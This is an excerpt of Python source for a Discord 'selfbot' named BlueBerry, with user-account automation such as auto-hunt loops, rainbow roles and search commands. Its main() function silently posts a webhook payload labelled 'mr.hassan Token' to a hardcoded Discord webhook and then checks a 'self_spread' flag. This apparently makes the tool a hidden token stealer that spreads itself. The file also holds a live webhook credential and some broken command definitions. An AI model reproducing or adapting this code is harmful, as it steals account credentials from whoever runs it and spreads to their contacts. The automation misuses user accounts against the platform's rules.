...
ctypes.windll.kernel32.SetConsoleTitleW(f'[BlueBerry Selfbot v{SELFBOT.__version__}] | Loading...')
...
def main():
    ...
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "mr.hassan Token",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/839592361176334386/is24KgK1rvxByuNZgSapubgJEnkGJcQHlzPxRuDbSc7ASb412O6d3PPb9oktD-zHyc-4", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
...
def startprint():
    ...
    print(f'''{Fore.RESET}
                         ...
                         |  _ \ | |( ) ( )/ __ \  _ \ / __ \  __)  __) ) ( )
                         | |_) )| || (_) |  ___/ |_) )  ___/ |  | |  | (_) |
                         (_ __/(___)\___/ \____)_ __/ \____)_)  (_)   \__  |
                                                                     ( )_| |
                                                                      \___/ 
                                             
                                                                
                       {Fore.CYAN}BlueBerry {SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Alucard.user.name}#{Alucard.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Alucard.user.id}   
                       ...
                       {Fore.CYAN}Coded by: {Fore.GREEN}mr.hassan#2751
                       {Fore.CYAN}hunt/fish: {Fore.GREEN}833762908781412382
...
async def on_connect():
    ...
    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[BlueBerry Selfbot v{SELFBOT.__version__}] | Logged in as {Alucard.user.name}')
...
@Alucard.command(aliases=['rainbow2-role'])
async def rainbow2(ctx, *, role): # b'\xfc'
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
...
@Alucard.command(name='auto-fish', aliases=['fish'])
...
@Alucard.command(name='auto-hunt', aliases=['hunt'])
async def _auto_hunt(ctx, channelid): # b'\xfc'
    await ctx.message.delete()
    count = 0
    while True:
        try:
            count += 1 
            channel = Alucard.get_channel(int(channelid))
            await channel.send(',hunt')           
            print(f'{Fore.BLUE}[AUTO-HUNT] {Fore.GREEN}hunt number: {count} sent'+Fore.RESET)
            await asyncio.sleep(300)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
...
@Alucard.command(name='image', aliase=['img', 'ig', 'gif'])
async def _image(ctx, text): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f"https://nekos.life/api/v2/img/{text}")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)
...
@Alucard.command(name='sendhelp', aliase=['helpsend', 'sh'])
async def _send_help(ctx): # b'\xfc'
    await ctx.message.delete()
    url = 'https://raw.githubusercontent.com/hassanXD0/hassanXD0/main/README.md'
    r = requests.get(url)
    if r.status_code == 200:
        await ctx.send(url)
    else:
...
@Alucard.command(name='help', aliase=['h'])
async def _help(ctx): # b'\xfc'
    await ctx.message.delete()
    url = 'https://raw.githubusercontent.com/hassanXD0/hassanXD0/main/README.md'
    r = requests.get(url)
    if r.status_code == 200:
...
@Alucard.command(name='nhelp', aliase=['nh'])
async def _nhelp(ctx): # b'\xfc'
    await ctx.message.delete()
...
async def link(ctx, *, text): # b'\xfc'
    ...
    if r.status_code == 200:
        ...
        print('web is currently under maintenance')

@Alucard.command()
async def link2(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    url = 'https://' + text 
    r = requests.get(url)
    if r.status_code == 200:
        webbrowser.close(text)
    else:
        print('web is currently under maintenance')

@Alucard.command(aliase=['spotify'])
async def stsearch(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    url = 'https://open.spotify.com/search/' + text
    r = requests.get(url)
    if r.status_code == 200:
        webbrowser.open(url)
    else:
        print('Spotify is currently under maintenance')

@Alucard.command(aliase=['youtube'])
async def ytsearch(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    ...
    if r.status_code == 200:
        ...
        print('Youtube is currently under maintenance')

@Alucard.command(aliase=['twitch'])
async def bot(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    url = (f'https://discord.com/oauth2/authorize?client_id={text}&scope=bot')
    r = requests.get(url)
    if r.status_code == 200:
        webbrowser.open(url)
    else:
        print('bot is currently under maintenance')

@Alucard.command(aliase=['twitch'])
async def twsearch(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    ...
    if r.status_code == 200:
        ...
        print('twitch is currently under maintenance')

@Alucard.command(aliase=['google'])
async def search(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    ...
    if r.status_code == 200:
        ...
        print('Google is currently under maintenance')
